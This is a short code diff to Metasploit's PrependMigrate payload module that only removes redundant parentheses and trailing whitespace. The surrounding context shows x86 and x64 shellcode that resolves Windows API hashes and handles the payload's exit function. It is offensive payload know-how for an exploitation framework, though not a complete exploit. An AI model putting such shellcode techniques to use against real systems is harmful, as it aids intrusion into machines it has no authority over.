@@ -36,7 +36,7 @@ module Msf::Payload::Windows::PrependMigrate
   def apply_prepend_migrate(buf)
     pre = ''
 
-    test_arch = [ *(self.arch) ]
+    test_arch = [ *self.arch ]
 
     if prepend_migrate?
       # Handle all x86 code here
@@ -73,7 +73,7 @@ module Msf::Payload::Windows::PrependMigrate
       push #{Rex::Text.block_api_hash("kernel32.dll", "Sleep")}           ; hash( "kernel32.dll", "Sleep" )
       call ebp                  ; Sleep( ... );
     ^
-    
+
     # Check to see if we can find exitfunc in the payload
     exitfunc_block_asm = %Q^
     exitfunk:
@@ -85,7 +85,7 @@ module Msf::Payload::Windows::PrependMigrate
       cmp bl, 0xE0            ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
       jne goodbye      ;
       mov ebx, #{Rex::Text.block_api_hash("ntdll.dll", "RtlExitUserThread")}    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThreadgoodbye:                 ; We now perform the actual call to the exit function
-    goodbye:  
+    goodbye:
       push 0x0            ; push the exit function parameter
       push ebx               ; push the hash of the exit function
       call ebp               ; call EXITFUNK( 0 );
@@ -266,7 +266,7 @@ module Msf::Payload::Windows::PrependMigrate
       call rbp              ; call EXITFUNK( 0 );
     ^
     # Check to see if we can find x64 exitfunc in the payload
-    
+
     exitfunc_block_blob = Metasm::Shellcode.assemble(Metasm::X64.new, exitfunc_block_asm).encode_string
     exitfunc_index = buf.index(exitfunc_block_blob)
     if exitfunc_index
